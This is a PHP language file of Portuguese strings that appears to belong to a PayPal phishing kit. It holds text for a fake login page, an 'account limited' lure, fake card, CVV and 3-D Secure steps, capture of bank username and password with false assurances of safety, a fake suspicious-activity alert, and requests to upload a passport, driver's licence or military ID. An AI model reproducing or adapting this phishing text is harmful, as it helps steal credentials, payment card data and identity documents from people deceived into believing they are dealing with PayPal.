<?php
#LOGIN
$wiz_111 = 'Inicie sessão na sua conta PayPaL';
$wiz_222 = 'Está a ter problemas para iniciar sessão?';
$wiz_333 = 'Inscrever-se';
$wiz_444 = 'Todos os direitos reservados ao PayPal Inc';
$wiz_900 = 'O email';
$wiz_901 = 'Senha';
$wiz_902 = 'Entrar';
#INFO
$wiz_555 = 'Perfil';
$wiz_666 = 'Atualize sua foto';
$wiz_777 = 'Oi de novo!';
$wiz_888 = 'Sua conta PayPal foi limitada!';
$wiz_999 = 'Informação requerida';
$wiz_903 = 'Primeiro nome';
$wiz_904 = 'Último nome';
$wiz_905 = 'Endereço';
$wiz_906 = 'Cidade';
$wiz_907 = 'Estado';
$wiz_910 = 'fecho eclair';
$wiz_911 = 'Número de telefone';

#-----NAV
$wiz_101 = 'Resumo';
$wiz_102 = 'Resumo';
$wiz_103 = 'Transferir';
$wiz_104 = 'Carteira';
$wiz_105 = 'Magasiner';
$wiz_106 = 'Sair';
$wiz_107 = 'Menu principal';
$wiz_108 = 'Conta';
$wiz_109 = 'Segurança';
$wiz_112 = 'Pagamentos';
$wiz_113 = 'Notificações';
#------FOOTER
$wiz_114 = 'AJUDA / CONTACTE-NOS';
$wiz_115 = 'SEGURANÇA';
$wiz_116 = 'Todos os direitos reservados.';
$wiz_117 = 'Respeito à privacidade';
$wiz_118 = 'Acordos Legais';
$wiz_119 = 'Comentários';
#-------CCV
$wiz_120 = 'Cartão de crédito';
$wiz_121 = 'Nome no cartão';
$wiz_123 = 'Número do cartão';
$wiz_124 = "Exp.";
$wiz_125 = 'CVV (3-4) code';
$wiz_126 = 'Endereço';
$wiz_127 = 'Confirmar e Processar';
#--------VBV
$wiz_128 = 'Bem-vindo à Verificação™';
$wiz_129 = 'Insira as informações abaixo para verificar sua identidade.';
$wiz_130 = 'Data de validade do cartão:';
$wiz_131 = 'Código de validação do cartão:';
$wiz_132 = 'Data de nascimento:';
$wiz_133 = 'Senha ou SecureCode(3d) :';
$wiz_134 = 'Todos os direitos reservados.';
#--------BANK
$wiz_135 = 'Escolha de um desses bancos comuns';
$wiz_136 = 'Seguro';
$wiz_137 = 'Eu tenho um banco diferente';
$wiz_138 = "É seguro compartilhar essas informações. O PayPal não o guarda.";
$wiz_139 = 'Clicando';
$wiz_140 = 'Continuar';
$wiz_141 = 'Concordo com os termos e condições para vincular minha conta bancária.';
$wiz_142 = 'Seu Banco';
$wiz_143 = "É seguro compartilhar essas informações. O PayPal não o guarda.";
$wiz_144 = 'Username';
$wiz_145 = 'Senha';
$wiz_146 = 'Clicando';
$wiz_147 = 'Continuar';
$wiz_148 = 'Concordo com os termos e condições para vincular minha conta bancária.';
$wiz_149 = 'Seu Banco';
$wiz_150 = 'Banco de nome';
#--------Loading AND Police
$wiz_151 = 'Em processamento';
$wiz_152 = 'Atividades suspeitas - Payapl';
$wiz_153 = 'Para ajudar a proteger sua conta, procuramos regularmente sinais precoces de atividade potencialmente fraudulenta.';
$wiz_154 = 'Estamos preocupados com a potencial atividade não autorizada';
$wiz_155 = 'Depois de confirmar a sua identidade, acompanharemos os passos para tornar a sua conta mais segura.';
$wiz_156 = 'Iniciar sessão a partir do dispositivo Desconhecido';
$wiz_157 = 'Próximo Ossining, US';
$wiz_158 = 'Só para sermos seguros, queremos ter a certeza de que esta é a sua conta.';
$wiz_159 = 'Contato';
$wiz_160 = 'Segurança';
$wiz_161 = 'Sair';
$wiz_162 = 'As seguintes etapas, você deve totalmente preenchido para manter a segurança de sua conta e que ele não é um avanço';
#--------UPLOAD CART ID
$wiz_163 = 'confirme sua identidade';
$wiz_164 = 'Selecionar';
$wiz_165 = 'Carregar prova de identidade (Recomendado)';
$wiz_166 = 'Receber um texto';
$wiz_167 = 'Receber um telefonema automatizado';
$wiz_168 = 'Erro esta opção não está disponível por um momento Tente outras opções';
$wiz_169 = 'Que tipo de documento você enviará?';
$wiz_170 = 'Mostrar requisitos de arquivo';
$wiz_171 = 'Os arquivos devem ser menores que 10 MB.';
$wiz_172 = 'Use um destes tipos de arquivo: JPG, GIF, PNG ou PDF.';
$wiz_173 = 'Carregar ficheiros que mostram dados actualizados e legíveis.';
$wiz_174 = 'Selecione qualquer um';
$wiz_175 = "Carteira de motorista";
$wiz_176 = 'Passaporte';
$wiz_177 = 'ID Militar';